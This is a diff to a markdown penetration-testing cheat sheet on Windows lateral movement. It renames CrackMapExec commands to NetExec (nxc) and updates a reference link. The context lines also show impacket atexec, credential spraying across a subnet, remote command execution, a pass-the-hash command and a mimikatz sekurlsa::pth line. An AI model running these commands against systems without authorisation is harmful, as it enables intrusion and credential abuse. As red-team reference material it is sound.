@@ -53,21 +53,21 @@ atexec.py 'DOMAIN/USER_NAME:USER_PASS@TARGET' 'whoami'
 
 **Note:** These tools are published both as scripts (`psexec.py`) and as Kali wrappers (`impacket-psexec`); the arguments are identical.
 
-## CrackMapExec / NetExec
+## NetExec
 
 Great for spraying one command across many hosts, and for checking where an account is admin (`(Pwn3d!)`).
 
 ```bash
 
 # Check admin access across a subnet
-cme smb 10.10.10.0/24 -u 'USER_NAME' -p 'USER_PASS'
+nxc smb 10.10.10.0/24 -u 'USER_NAME' -p 'USER_PASS'
 
 # Run a command (SMB uses wmiexec/smbexec under the hood)
-cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' -x 'whoami'         # cmd
-cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' -X 'whoami'         # powershell
+nxc smb TARGET -u 'USER_NAME' -p 'USER_PASS' -x 'whoami'         # cmd
+nxc smb TARGET -u 'USER_NAME' -p 'USER_PASS' -X 'whoami'         # powershell
 
 # Pass-the-hash / local account
-cme smb TARGET -u 'Administrator' -H 'NT_HASH' --local-auth -x 'whoami'
+nxc smb TARGET -u 'Administrator' -H 'NT_HASH' --local-auth -x 'whoami'
 
 ```
 
@@ -125,6 +125,6 @@ sekurlsa::pth /user:USER_NAME /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe
 ## References
 
 - impacket - https://github.com/fortra/impacket
-- CrackMapExec / NetExec - https://github.com/Pennyw0rth/NetExec
+- NetExec - https://github.com/Pennyw0rth/NetExec
 - evil-winrm - https://github.com/Hackplayers/evil-winrm
 - The Hacker Recipes - Lateral movement - https://www.thehacker.recipes/ad/movement/
